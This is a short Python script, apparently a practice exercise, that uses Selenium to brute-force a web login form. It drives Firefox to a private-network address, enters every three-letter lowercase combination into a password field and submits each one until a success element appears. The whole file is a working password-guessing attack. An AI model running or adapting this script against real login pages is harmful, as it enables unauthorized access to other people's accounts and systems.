import string
from itertools import product
from selenium import webdriver

def convertTuple(tupple):
    # initialize an empty string
    str = ''
    for item in tupple:
        str = str + item
    return str

def site_attack(password_len, char_list, site_adress):

    driver = webdriver.Firefox()
    driver.get(site_adress)

    password1 = driver.find_element("id", "pass")

    for i in product(char_list, repeat=password_len):
        # turn the tuple into string
        guess_string = convertTuple(i)

        password1.send_keys(guess_string)

        click1 = driver.find_element("id", "sub")
        click1.click()

        display1 = driver.find_element("id", "yes")

        if display1.is_displayed() == True:
            print("password found!\n")
            return guess_string

        password1.clear()


print(site_attack(3, list(string.ascii_lowercase), "http://10.1.0.138/"))


